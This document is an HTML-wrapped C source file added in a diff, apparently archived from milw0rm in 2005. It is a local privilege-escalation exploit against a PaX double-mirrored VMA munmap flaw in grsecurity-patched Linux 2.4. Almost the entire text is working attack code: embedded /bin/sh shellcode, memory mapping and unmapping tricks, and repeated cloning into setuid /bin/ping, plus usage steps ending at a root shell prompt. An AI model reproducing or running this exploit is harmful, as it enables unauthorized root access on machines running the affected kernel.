@@ -1,0 +1,165 @@
+<html>
+<head>
+<title>PaX Double-Mirrored VMA munmap Local Root Exploit</title>
+<pre>
+/*
+ *  PaX double-mirrored VMA munmap local root exploit
+ *
+ *  Copyright (C) 2005  Christophe Devine
+ *
+ *  This exploit has only been tested on Debian 3.0 running Linux 2.4.29
+ *  patched with grsecurity-2.1.1-2.4.29-200501231159
+ *
+ *  $ gcc paxomatic.c
+ *  $ ./chpax -m a.out
+ *  $ ./a.out
+ *  ...
+ *  usage: ping [-LRdfnqrv] [-c count] [-i wait] [-l preload]
+ *          [-p pattern] [-s packetsize] [-t ttl] [-I interface address] host
+ *  sh-2.05a# 
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program; if not, write to the Free Software
+ *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ */
+
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sched.h&gt;
+
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;asm/page.h&gt;
+
+#define MAXTRIES 64
+#define PGD1_BASE 0x40000000
+#define PGD2_BASE 0x50000000
+#define PGD_SIZE (PAGE_SIZE * 1024)
+#define MMTARGET (PGD1_BASE + PAGE_SIZE * 2)
+
+unsigned char child_stack[PAGE_SIZE];
+
+char exec_sh[] =                    /* from shellcode.org */
+
+    &quot;\x31\xdb&quot;                      /* xorl         %ebx,%ebx       */
+    &quot;\x8d\x43\x17&quot;                  /* leal         0x17(%ebx),%eax */
+    &quot;\xcd\x80&quot;                      /* int          $0x80           */
+    &quot;\x31\xd2&quot;                      /* xorl         %edx,%edx       */
+    &quot;\x52&quot;                          /* pushl        %edx            */
+    &quot;\x68\x6e\x2f\x73\x68&quot;          /* pushl        $0x68732f6e     */
+    &quot;\x68\x2f\x2f\x62\x69&quot;          /* pushl        $0x69622f2f     */
+    &quot;\x89\xe3&quot;                      /* movl         %esp,%ebx       */
+    &quot;\x52&quot;                          /* pushl        %edx            */
+    &quot;\x53&quot;                          /* pushl        %ebx            */
+    &quot;\x89\xe1&quot;                      /* movl         %esp,%ecx       */
+    &quot;\xb0\x0b&quot;                      /* movb         $0xb,%al        */
+    &quot;\xcd\x80&quot;;                     /* int          $0x80           */
+
+int child_thread( void *arg )
+{
+    char *argv[2], *envp[1];
+
+    argv[0] = (char *) arg;
+    argv[1] = NULL;
+    envp[0] = NULL;
+
+    execve( (char *) arg, argv, envp );
+
+    exit( 1 );
+}
+
+int main( void )
+{
+    int i, j, n, pid, s;
+
+    for( i = 0; i &lt; MAXTRIES; i++ )
+    {
+        printf( &quot;Try %d of %d\n&quot;, i, MAXTRIES );
+
+        if( mmap( (void *) PGD1_BASE, PAGE_SIZE, PROT_READ, MAP_FIXED |
+                  MAP_ANONYMOUS | MAP_PRIVATE, 0, 0 ) == (void *) -1 )
+        {
+            perror( &quot;mmap pgd1 base\n&quot; );
+            return( 1 );
+        }
+
+        if( mmap( (void *) PGD2_BASE, PAGE_SIZE, PROT_READ, MAP_FIXED |
+                  MAP_ANONYMOUS | MAP_PRIVATE, 0, 0 ) == (void *) -1 )
+        {
+            perror( &quot;mmap pgd2 base\n&quot; );
+            return( 1 );
+        }
+
+        if( mprotect( (void *) PGD1_BASE, PAGE_SIZE,
+                      PROT_READ | PROT_EXEC ) &lt; 0 )
+        {
+            perror( &quot;mprotect pgd1 base&quot; );
+            fprintf( stderr, &quot;run chpax -m on this executable\n&quot; );
+            return( 1 );
+        }
+
+        if( mmap( (void *) MMTARGET, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
+                  MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0 ) == (void *) -1 )
+        {
+            perror( &quot;mmap target\n&quot; );
+            return( 1 );
+        }
+
+        for( j = 0; j &lt; 1; j++ )
+        {
+            memset( (void *) MMTARGET + PAGE_SIZE * j, 0x90, PAGE_SIZE );
+            n = 16 + ( sizeof( exec_sh ) &amp; 0xFFF0 );
+            memcpy( (void *) MMTARGET + PAGE_SIZE * ( j + 1 ) - n, exec_sh, n );
+        }
+
+        if( mprotect( (void *) MMTARGET, PAGE_SIZE,
+                      PROT_READ | PROT_EXEC ) &lt; 0 )
+        {
+            perror( &quot;mprotect target&quot; );
+            return( 1 );
+        }
+
+        munmap( (void *) PGD1_BASE, PGD_SIZE );
+        munmap( (void *) PGD2_BASE, PGD_SIZE );
+
+        for( j = 0; j &lt; 8; j++ )
+        {
+            if( ( pid = clone( child_thread, child_stack + PAGE_SIZE,
+                               SIGCHLD | CLONE_VM, &quot;/bin/ping&quot; ) ) == -1 )
+            {
+                perror( &quot;clone suid&quot; );
+                return( 1 );
+            }
+
+            waitpid( pid, &amp;s, 0 );
+
+            if( ! WEXITSTATUS(s) &amp;&amp; ! WIFSIGNALED(s) )
+            {
+                printf( &quot;hasta luego...\n&quot; );
+                return( 0 );
+            }
+        }
+
+        fflush( stdout );
+    }
+
+    printf( &quot;shit happens\n&quot; );
+
+    return( 1 );
+}
+
+// milw0rm.com [2005-03-14]
+</pre>
+</html>
+
